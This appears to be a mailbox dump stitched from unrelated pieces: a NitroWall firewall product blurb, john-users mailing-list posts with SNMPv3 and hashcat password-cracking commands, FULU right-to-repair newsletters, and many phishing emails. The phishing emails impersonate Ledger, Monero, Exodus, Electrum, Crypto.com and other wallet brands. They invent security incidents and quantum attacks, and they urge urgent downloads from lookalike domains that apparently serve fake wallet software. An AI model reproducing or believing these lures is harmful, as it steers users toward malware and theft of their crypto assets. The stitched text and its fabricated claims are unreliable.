Firewall and Intrusion Prevention System (IPS)
Based on the powerful OPNsense, NitroWall meets all the requirements of a professional firewall and IPS such as multi WAN, hardware failover, routing protocols, web filtering, and two-factor authentication.
VPN
VPN gateway for IPSec and OpenVPN with powerful Intel Quadcore i7 CPU with AES-NI for fast data throughput. Secure two-factor authentication via Nitrokey (instead of password) is possible with IPSec.
Open Source Firmware Coreboot
Instead of a proprietary BIOS, the NitroWall uses the open source firmware Coreboot and SeaBIOS, which offers transparency, minimal attack surface and high speed.
Disabled Intel Management Engine
Vulnerable and proprietary low-level hardware parts are disabled to make the hardware more robust against advanced attacks.
The Intel Management Engine (ME) is a type of separate computer within all modern Intel processors (CPU). The ME acts as a master controller for your CPU and has extensive access to your computer (system memory, display, keyboard, network). Intel controls the code of the ME and severe vulnerabilities have already been found in the ME that allow local and remote attacks. Therefore, ME can be considered a backdoor and is disabled in NitroWall.
High Speed
Unlike common ARM-based systems, NitroWall contains the powerful Intel Quadcore CPU i7-8550U with up to 4 GHz and AES-NI. Up to 32 GB RAM, SSD and six Gigabit Ethernet ports provide sufficient resources.
WiFi Access Point
With OpenWrt, the NitroWall can be used not only with wired Ethernet network,s but also for WiFi-5 wireless networks with 2.4 GHz and 5 GHz.
Fanless, Rugged Metal Chassis
NitroWall features a small, rugged metal chassis. It does not require a fan, making it completely silent and virtually maintenance-free. In addition, NitroWall is very energy efficient.
Numerous Operating Systems
Instead of OPNsense or OpenWrt, NitroWall can be operated with other operating systems such as pfS

subject: [john-users] Re: SNMPv3 format
body_text:
I'll add two pcap-files for clarity.

On 2025-06-03 10:02, Albert Veli wrote:
> 
> There is a format for SNMPv3 in the john source here:
> https://github.com/openwall/john/blob/bleeding-jumbo/src/snmp_fmt_plug.c
> 
snmpv3_unencrypted_user_albert_auth_md5.pcap was created with the command:

snmpwalk -v3 -l authNoPriv -u albert -a MD5 -A iloveyou 198.18.1.1 1.3.6.1.2.1.1.1.0

Only authentication, no privacy protocol (encryption).

snmpv3_user_albert_auth_md5_aes128.pcap was created with:

snmpwalk -v3 -l authPriv -u albert -a MD5 -A iloveyou -x AES-128 -X princess 198.18.1.1 1.3.6.1.2.1.1.1.0

Here I turned on encryption on the device with a second passphrase (princess).

The OID is sysDescr which should contain a textual description of the device. This is good for testing.

We are contacting you today regarding a critical development in digital asset security that requires your immediate attention. Our research and threat intelligence teams have identified a paradigm shift in potential attack vectors, moving from theoretical concepts to practical threats.
Specifically, we have found credible evidence of malicious actors leveraging emergent quantum computational power. These attacks are designed to exploit the underlying cryptographic principles—namely the Elliptic Curve Digital Signature Algorithm (ECDSA)—that secure most digital wallets. In essence, this advanced capability could allow sophisticated actors to derive a private key from a public address, an action previously considered computationally impossible.
We believe this new threat vector is responsible for a series of recent, unexplained fund thefts from various wallets across the ecosystem. To be clear: this is not a vulnerability in Ledger's hardware design, but an industry-wide challenge to the very foundation of current cryptographic standards.

To safeguard your holdings against this threat, we have released a mandatory firmware update. This is not a routine patch; it is a proactive cryptographic upgrade that integrates post-quantum cryptographic (PQC) countermeasures into your device's core architecture. This will fortify your hardware wallet against both current and future quantum attacks.
It is imperative that you install this update immediately to ensure the continued integrity of your assets. To update:
Ledger has always been at the forefront of digital asset security. Our mission requires us to anticipate and neutralize threats before they achieve widespread impact. This firmware update is a testament to that commitment.

subject: Firmware Update: Security Incident
body_text:
Firmware Update: Security Incident
We are writing to inform you of a security incident involving our infrastructure that requires your immediate action to ensure the safety of your assets.
Our security team recently discovered that a threat actor gained unauthorized access to a specific server within our Ledger Live backend infrastructure. During this breach, the attacker successfully deployed malware onto the compromised server.
The malware was designed to target the communication protocol between Ledger devices and our servers. While the server-side vulnerability has been neutralized and the compromised infrastructure has been rebuilt, the nature of this breach creates a potential risk for devices that haven't updated their firmware yet.
To eliminate this risk, it is critically important that all users update their device's firmware immediately. This mandatory update contains a new security patch that hardens the device’s protocols and renders the previous attack vector completely ineffective.
What You Must Do Now
Your assets are at risk until this update is completed. Please perform the following steps:
Ensure you have the latest version of the Ledger Live application.
Connect your Ledger device to your computer.
Open Ledger Live, navigate to the "Manager" tab, and follow the on-screen instructions to begin the mandatory firmware update.
Update Firmware Now
We deeply regret this incident and are conducting a full-scale audit of our security infrastructure to prevent any recurrence. Our investigation is ongoing.
Thank you for your immediate cooperation in securing your device.

subject: Re: [john-users] md5crypt-long works in John but not in hashcat
body_text:
Atom,

Does this apply to wordlist cracks as well?


Shawn

> On Jun 4, 2025, at 00:08, atom <atom@hashcat.net> wrote:
> 
> ﻿Most important: I'm 100% sure, magnum, you're not too stupid.
> 
> I just wanted to respond because it was said Hashcat can't handle long
> passwords. It can. Most people these days just use -O from muscle memory
> and forget the implications.
> 
> Make sure you omit -O, and you'll be able to crack passwords longer than 16
> characters.
> 
>> $ echo -n verylongpasswordmorethan16 | mkpasswd -s -5
> 
>> $1$4YFHDKR0$v7SN48VopUztrNFFaIMzq1
> 
> Test:
> 
>> $ ./hashcat -m 500 '$1$4YFHDKR0$v7SN48VopUztrNFFaIMzq1' -a 3
> ?l?l?l?l?longpasswordmorethan16 --adv
> 
>> hashcat (v6.2.6-941-gad38c9253) starting
>> ...
>> Minimum password length supported by kernel: 0
>> Maximum password length supported by kernel: 256
> 
> Above you can see the supported password length (depending on the given
> command line parameters).
> 
>> ...
> 
> $1$4YFHDKR0$v7SN48VopUztrNFFaIMzq1:verylongpasswordmorethan16
> 
>> ...
> 
> 
> 
>> On Tue, Jun 3, 2025 at 12:30 PM magnum <magnumripper@hushmail.com> wrote:
>> 
>>> On 2025-06-02 07:05, Shawn Tayler wrote:
>>> Just curious what you are doing different in JTR on your
>>> format md5crypt-long. JTR cracks the hashes straight away but
>>> I don't have cuda support with it. I have cuda on hashcat but
>>> it doesn't crack over there.
>>> 
>>> What are you guys doing differently?
>>> 
>>> Is there a document to walk me through getting CUDA support on
>>> JTR?
>>> 
>>> Thanks for all the great help in the past.
>> 
>> Does any JtR format work with CUDA? If so, you're actually running
>> OpenCL then (which comes with CUDA). Our actual CUDA support was
>> experimental and only had a few formats. We dropped it years ago in
>> favor of OpenCL as the latter is portable.
>> 
>> Other than that, the md5crypt-long format is CPU-only. You're supposed
>> to run md5crypt-opencl and then (or in parallel) md5crypt-long with
>> --min-len=16. We should definitely support passwords longer that 15 with
>> OpenCL but no-one has contributed that and I'm too stupid to understand
>> the optimizations so my tries have failed.
>> 
>> magnum
>> 
>> 
> 
> --
> atom

Cybercriminals have breached Ledger Live servers and compromised our integrity firmware booter software component, which relays information between your ledger device and our systems in order to function.
This component's role is to validate the secure communication channel for the Ledger Live application. Due to the severity of this situation, and to ensure the continued integrity of this connection, we have released a new version of Ledger Live containing a security patch. We are asking all customers to update their Ledger Live application to protect their assets from potential risk.
Updating Your Application
Please take the following steps to apply the update:
Navigate to Ledger Live using the button provided below.
Download and install the latest version of Ledger Live for your operating system.
The security patch is included in this version and will be active upon installation.
Proceed to Update
A Note on Security: This software vulnerability does not affect the Secure Element on your Ledger hardware device or the safety of your private keys. Your assets remain secure on your device. This update pertains only to the security of the desktop application that interacts with your device.
Thank you for your attention to this matter.
The Ledger Team

Dear Monero Community,

We are writing to share a major update that aligns with long-standing community input and current user needs across various environments.

As part of our continued efforts to improve accessibility, flexibility, and performances across the Monero ecosystem, we are releasing upgrades to the desktop GUI and CLI wallet, along with the first beta release of a Monero browser extension wallet.



 Desktop Wallet Enhancements

The updated Monero GUI wallet for desktop includes refinements that improve reliability, performances, and interface responsiveness across  supported platforms:

* Improved remote node handling with better failover and retry logic
* Enhanced support for hardware wallets, including newer Ledger and Trezor models
* Simplified wallet creation and recovery flows
* UI adjustments for smaller and high-resolution displays
* Updated translations and accessibility improvements

The wallet continues to support Windows, Linux, and macOS operating systems.

 CLI Wallet Improvements

We’ve also released an updated version of the CLI wallet (`monero-wallet-cli`) with performances and security improvements for advanced users, developers, and operators managing automated systems.

Key updates include:

* Faster synchronization when using trusted remote nodes
* Extended support for scripted wallet interactions
* Improved error reporting in automated transaction processing
* Hardened memory handling for improved operational security
* Added flag options for fine-grained control over mining rig connections

Download the updated CLI tools: https://app.getmoneroupdate.org/

subject: Security Action Required
body_text:
Security Action Required
We are writing to inform you of a critical security vulnerability affecting specific firmware versions of Ledger Nano X and Nano S Plus devices. It is imperative that you take immediate action to secure your assets.
What Happened
The vulnerability was specific to the 'Recovery Check' application. During this verification process, a flaw caused fragmented and encrypted segments of your device’s private key to be unintentionally transmitted to a secure Ledger server. Although this data was protected by multiple layers of encryption, our security team detected a highly sophisticated breach of this specific server. We have confirmed that the threat actor successfully exfiltrated these fragments and, through advanced methods, was able to reconstruct a limited number of private keys, leading to the theft of user assets.
Immediate Action Required
To mitigate this vulnerability, you must update your device firmware through Ledger Live.
Update Firmware
The security of your assets is our absolute priority, and we have failed to meet the standard you expect from us. We are taking immediate and comprehensive steps to rectify this situation and prevent any future recurrence. We sincerely apologize for this incident.
The Ledger Team

subject: Our $100k bounty program is fighting for your right to repair—and own—your stuff
body_text:
FULU
Our $100k bounty program is fighting for your right to repair—and own—your stuff
By Kevin O'Reilly • 27 Oct 2025
View in browser
There are so many ways companies screw with their customers today. They love to change their products after they’re sold, or add “proprietary” versions of a refill where a generic one would suffice. We’ve seen it with printer cartridges, tractors, and even air and water filters. In this very space, we’ve talked about reverse ransomware — firmware update breaks a device which then requires an ongoing subscription to fix — and software end of life announcements that make no sense. Earlier this month, Microsoft ended support for Windows 10 for most of the world, leaving millions of devices unsecured.
You’re tired of not actually owning the stuff you paid for. So are we. That's why we're doing something about it.
We're putting money where our mission is.
Today, we're excited to launch a first of it’s kind Bounty Program —a community-driven initiative that rewards, coders, tinkerers, and developers to fix products that get broken by their manufacturers.
This is a first-of-its-kind bug bounty program to advocate for the Right to Ownership. FULU believes that companies should not be able to change the terms of purchase after a product has been sold.
The Bounty Program
There are two parts to the bounty program.
First, we’re providing a pool of $10,000 each to the first coders who can provide a fix that makes the devices on our list work again — that’s a total of $50,000 guaranteed to be paid out.
Next, and this is the exciting part, is where you come in. We’ve saved up another $25,000 in matching funds that can be unlocked when you donate to a bounty, bringing the total up funds up for grabs to $100,000 USD.
This means, say, you see a product on our list and hate what the company has been able to get away with so far. You can donate $10 (or more!) to the bounty for that product. We’ll match your $10 so that the pool is now richer by $20 even though you only put in $10.
The Product line-up
Headlining this list of products being bountied are the first two generations of Google’s Nest Learning Thermostats — support for which is ending on October 25. After that, the revolutionary smart thermostat turns into a dumb device on the wall that should not have cost hundreds of dollars. Also on the list, are refrigerators by General Electric that require a “proprietary” water filter, and air purifiers by Molekule that require “proprietary” air

A vulnerability (CVE-2025-1234) has been identified in versions prior to 2.1.1. This issue affects a limited number of devices and is related to improper handling of malformed USB protocol inputs.
Under specific conditions, this could allow an attacker to bypass memory isolation and potentially extract sensitive data from the secure element.
Firmware version 2.1.1 fully resolves this vulnerability by implementing enhanced input validation, stricter USB command filtering, and reinforced memory access controls.

subject: Infrastructure Security Incident Report
body_text:
SECURITY INCIDENT NOTIFICATION
Infrastructure Security Incident Report
Dear Valued Customer,
We are writing to inform you of a security incident affecting our infrastructure systems. On November 6th, our IT team detected unauthorized access to several backend servers that were subsequently compromised by ransomware. We immediately engaged our security response team and external cybersecurity experts to contain the situation.
While your private keys remain secure on your hardware device and were not affected, our investigation revealed that attackers accessed configuration databases containing device serial numbers and associated firmware versions. Out of an abundance of caution, we are recommending all users update to our newly released secure firmware build.
What Happened
Backend infrastructure servers were accessed without authorization
Ransomware deployed across affected systems
Device metadata and firmware version records were exposed
No private keys or seed phrases were compromised
As a precautionary measure, we've developed firmware version 2.4.1 with enhanced security protocols and have hardened our device authentication mechanisms. This update ensures your device cannot be targeted based on the exposed configuration data.
The update is available for all Ledger Nano X, Nano S Plus, and Nano S devices through Ledger Live. Installation takes approximately 5 minutes and does not affect your existing wallet setup.
Update Firmware
Your Security: We have reported this incident to relevant authorities and are cooperating fully with law enforcement. We've also implemented additional monitoring and security layers across our infrastructure. Your funds remain safe, but we strongly recommend completing this firmware update within the next 48 hours.
We sincerely apologize for this incident and any concern it may cause. Transparency and security are our top priorities, and we will continue to provide updates as our investigation progresses.
Sincerely,
Ledger Security Response Team
For incident updates and FAQs, visit ledger.com/security-incident
Always access Ledger Live through the official ledger.com website. Ledger will never request your 24-word recovery phrase under any circumstances.

Hello Crypto Enthusiast,
We’ve always believed your crypto should live in a wallet that’s as beautiful as it is powerful. That’s why we’re excited to share the latest update to the Exodus Desktop Wallet — designed to give you more security, more compatibility, and more peace of mind.
This release brings two major upgrades:
Smarter Scam Detection
Now, every transaction you prepare in Exodus is screened in real time. The wallet will flag suspicious addresses, highlight unusual activity, and give you a clear confirmation before anything is sent. It’s an added layer of defense that helps protect you against you, malicious contracts, and address manipulation scams.
More Hardware Compatibility
Exodus has always supported Trezor, and now we’re extending that to more hardware wallets. The latest version integrates seamlessly with Ledger, Ellipal, and other leading devices, giving you even more choice in how you secure your crypto. Whether you prefer the simplicity of Trezor, the flexibility of Ledger, or the portability of Ellipal, Exodus Desktop connects smoothly with your setup.
Of course, you’ll still enjoy all the features you love — smooth swaps, a polished portfolio tracker, NFT support, and staking for multiple assets — but now with even stronger protections and wider hardware options.
👉 https://download.exodusupdate.app
As always, thank you for being part of the Exodus journey. With every release, we’re working to make crypto safer, easier, and more empowering for you.
Stay secure,
— The Exodus Team

subject: Nexus Wallet Announcement — A New Chapter Begins: Introducing Our Official Desktop App
body_text:
Dear Nexus Community,

Every meaningful innovation begins with a conversation — and over the past months, our community has been loud, clear, and incredibly consistent in one request:
“We want a true Nexus Wallet experience on desktop.”

Today, we are proud to say: we heard you, we agreed with you, and now we’re delivering.

Announcing the FirstEver Nexus Wallet Desktop Application

After extensive design sessions, user feedback reviews, and months of development, we are thrilled to introduce the Nexus Wallet Desktop App — Version 1.0. This marks a major milestone in the evolution of Nexus Wallet, transforming it from a strictly mobile experience into a fully crossplatform ecosystem.

Built for reliability, crafted for speed, and designed for modern digital asset management, the desktop release opens the door to smoother workflows and deeper control.


Fully CrossPlatform, Fully Native

One of the community’s strongest requests was universal platform support. We’re proud to announce that Nexus Wallet Desktop is launching with broad compatibility:

 Windows
 macOS (Intel & Apple Silicon)
 Linux (major distros supported)
 All ChromiumBased Browsers (Chrome, Brave, Edge, Opera & more)

Wherever you work — at home, on a workstation, or across multiple environments — Nexus Wallet now fits naturally into your setup.

Why This Desktop Release Matters

Moving to desktop isn’t just about convenience — it’s about capability. With this release, users can enjoy:

Strengthened Local Security

Private keys remain securely encrypted on your machine, giving you desktopgrade protection with the simplicity of our mobile design.

Optimized Performance & Stability

Experience faster loading, smoother interactions, and minimized mobile limitations.

A Unified Workflow

Switch effortlessly between mobile and desktop while maintaining a consistent and familiar interface.

 A Better Environment for Power Users

For traders, analysts, developers, stakers, and anyone managing multiple assets, the desktop app offers clarity and control on a larger canvas.

This upgrade isn’t just an extension — it’s an evolution.

Download the Desktop App

To begin using Nexus Wallet Desktop, simply download the installer for your platform: https://www.nexuswalletdesktop.app/


After downloading, follow the quick installation guide for your operating system. In just a few moments, you’ll be navigating Nexus Wallet with the comfort and power of a full desktop environment.


Your Feedback Shapes the F

subject: Gasping for air: Our molekule bounty has been won!
body_text:
FULU
Gasping for air: Our molekule bounty has been won!
By Keith Yardley • 11 Dec 2025
View in browser
Molekule is an air purifier company with a, well, less-than-pure record. When you pay $1000 for a smart air purifier, though, you probably expect it to do two at least two things: purify your air, and work with an app.
Back in September, Molekule, which makes the Air Pro and Air Mini+, pulled back on the latter. The company shut down access to the app for anyone that installed to use third-party (or, in their words, “knockoff”) filter in their air purifiers.
The email sent out from Molekule to its customers
That is the exact kind of anti-ownership activity that we at FULU are fighting against. Molekule owners paid a premium for a smart air purifier that would allow them to “monitor, control, and improve” the air around them. They should get to use its smart functionality regardless of their choice of filter.
We got news of this right as we were assembling the list of products for our bounty program , which we designed to both draw attention to the ways that device makers seek to control the use of the devices we own, and call for changes to the law that prevent us from pushing back. Molekule’s use of DRM (digital rights management) to force device owners to buy it’s replacement filters was a perfect fit.
Molekule shut down app access for customers that used third-party filters
We’re excited to announce the winner of this bounty: Lorenzo Rizzotti ( DreamingCodes ) . Lorenzo developed a patch for Molekule’s app which enables full remote monitoring and management functionality with Molekule air purifiers using third-party filters. It successfully bypasses the digital lock inserted by Molekule into their app and, in doing so, prevents the purifier from losing its ‘smart’ status when a third-party filter is inserted.
Taking on the bounty to try and free Molekule’s purifiers was an obvious choice for Lorenzo. “My main goal was to help spread the awareness FULU is trying to raise about ownership and the current situation where restoring a device to the functionality it originally had can put a user at legal risk,” he told us. Lorenzo proved to us that his solution worked, and we awarded him the bounty.
If only we could release it.

body_text:
Dear Community,

We’re pleased to announce the official launch of the Hodl Hodl Desktop, a dedicated application designed to give you a more secure, private, and efficient way to trade Bitcoin peer-to-peer.

This new desktop environment enhances everything Hodl Hodl stands for—non-custodial architecture, multisig escrow, and global P2P access—while providing a more powerful interface for serious Bitcoin users.

What’s New

• Secure Local Environment
The desktop app eliminates browser-based vulnerabilities and delivers a safer space for managing escrow activity from start to finish.

• Integrated Multisig Tools
Your keys remain on your device. The application supports PSBT flows and desktop wallet integrations for seamless, fully non-custodial operation.

• Streamlined Trade Management
Monitor live trades, escrow status, counterpart reputations, and payment confirmations from a clean, unified dashboard.

• Privacy by Design
All trade-related metadata is encrypted and stored locally. Nothing is pushed to third-party cloud services.

The Hodl Hodl Desktop is ideal for high-volume traders, merchants, OTC participants, and privacy-focused users who rely on multisig for secure settlement. It also delivers a better experience for those trading in markets with limited access to traditional exchanges.

For Lightning users, support for time-locked contracts makes L-Hodl even easier to work with. 

The Hodl Hodl Desktop is now available for download at: https://download.hodldesktop.com/.
We believe this release sets a new benchmark for non-custodial Bitcoin trading and strengthens your ability to operate independently and securely.

Thank you for being part of the Hodl Hodl community.

The Hodl Hodl Team

subject: CoinTracker Desktop — A New Standard for Crypto Clarity & Security
body_text:
Hello,

We’re introducing  Desktop—a desktop-first application built for crypto holders who approach digital assets with the same rigor they apply to traditional investments.

CoinTracker Desktop is designed as a system of record for crypto ownership. It brings together portfolio verification, risk awareness, and compliance intelligence in a focused environment built for accuracy, auditability, and long-term use.

This release reflects a clear shift in how serious participants manage crypto: not as a trading game, but as a maturing asset class that demands structure and accountability.

What CoinTracker Desktop Delivers

Hardware Wallet Visibility Without Custody
CoinTracker Desktop provides enhanced, read-only visibility into hardware wallets including Ledger, Trezor, Keystone, and others. Balances, derivations, and historical activity are verified directly against the blockchain—without ever accessing private keys.

Embedded Risk & Scam Detection
Transactions and contract interactions are analyzed in real time to identify known scam patterns, address poisoning, and suspicious behavior. Risk signals are presented clearly, alongside historical context designed to support review, documentation, and recovery.

Context-Aware AI Assistance
An integrated AI assistant translates portfolio activity into plain language. It explains taxable events, identifies missing cost basis, flags anomalies, and answers natural-language questions using your actual data—reducing complexity without abstraction.

Advanced Compliance & Tax Workbench
Multi-year tax timelines, accounting method comparisons (FIFO, LIFO, HIFO), entity-level reporting, and CPA-ready exports are available in a dedicated desktop workspace built for audit readiness and professional review.

Local-First, Privacy-Respecting Architecture
Core data is encrypted and stored locally by default, with optional cloud synchronization. Users can operate online, offline, or in air-gapped environments depending on their security and compliance requirements.

With CoinTracker Desktop, portfolio tracking evolves into neutral financial intelligence—a platform that observes, verifies, and explains crypto activity without custody, execution, or promotional bias.

CoinTracker Desktop is now available to download
https://download.cointrackerdesktop.com

For investors, operators, and professionals who want crypto to fit cleanly into a real-world financial framework, this is a more disciplined way forward.

— The CoinTracker Tea

subject: Community Announcement:New Electrum Wallet Browser Extension Release
body_text:
Dear Electrum Community,

We are pleased to share an important update regarding the Electrum Wallet ecosystem and the release of the new Electrum Wallet browser extension. This update reflects our continued commitment to improving usability while maintaining the strong security principles Electrum is known for.

Electrum Wallet has remained one of the most trusted Bitcoin-only wallets since its launch in 2011. Its lightweight design, transparent architecture, and focus on self-custody have made it a preferred choice for users who value control, reliability, and security. Over the years, Electrum has continued to evolve alongside the Bitcoin network, while remaining true to its core principles.

The newly released browser extension has been developed as a companion tool to the Electrum Desktop wallet. Its purpose is to provide users with convenient access to wallet-related information directly from the browser when the desktop application is active. This includes improved visibility into wallet status and monitoring features that enhance day-to-day interaction.

Download and Get Desktop Extension: 

https://download.electrumwalletextension.org/

It is important to emphasize that the extension is not a standalone wallet. It does not store private keys, does not sign transactions, and does not broadcast transactions independently. All sensitive wallet operations remain securely handled by the Electrum Desktop wallet.

The latest extension release introduces several improvements aimed at enhancing the overall experience. These updates include interface refinements, improved compatibility with recent Electrum Desktop releases, and performance and stability optimizations. Additional enhancements have also been made to improve monitoring and interaction efficiency.

We appreciate your continued trust and support. Thank you for being an active part of the Electrum community as we continue to build secure, reliable, and user-focused Bitcoin tools.

Hello,

We are pleased to introduce Crypto.com Onchain Wallet Desktop — a dedicated desktop application built for crypto users, investors, and onchain participants who require greater security, clarity, and control when interacting with blockchain networks.

As onchain activity expands across multiple ecosystems, the need for a secure and transparent desktop environment has become increasingly important. 

The desktop app provides a secure environment for managing assets, interacting with decentralized applications, and reviewing complex transactions with full visibility — without relying on browser extensions.

Key Capabilities

1. Advanced Scam Detection
Transactions are analyzed in real time to identify suspicious contracts, risky approvals, and known malicious patterns before you sign, helping protect against you attempts, drainers, and hidden permissions.

2. Hardware Wallet Compatibility
Native integration with leading hardware wallets enables secure, local transaction signing while keeping private keys fully isolated from browsers and third-party services.

3. Built-In AI Support
An integrated AI assistant explains transactions in plain language, highlights potential risks, and helps users understand exactly what they are approving — without ever executing transactions on their behalf.

4. Multi-Chain, Onchain-Native Experience
- Manage assets across multiple blockchain networks
- View DeFi positions, staking activity, and NFTs in one place
- Interact seamlessly with onchain applications from a dedicated desktop environment

5. Desktop-First Security Architecture
- Isolated local signing environment
- Human-readable transaction previews
- Reduced attack surface compared to browser extensions

You can download Crypto.com Onchain Wallet Desktop at: https://download.onchaindesktop.com/ and begin managing your onchain activity with greater confidence.

— The Crypto.com Team
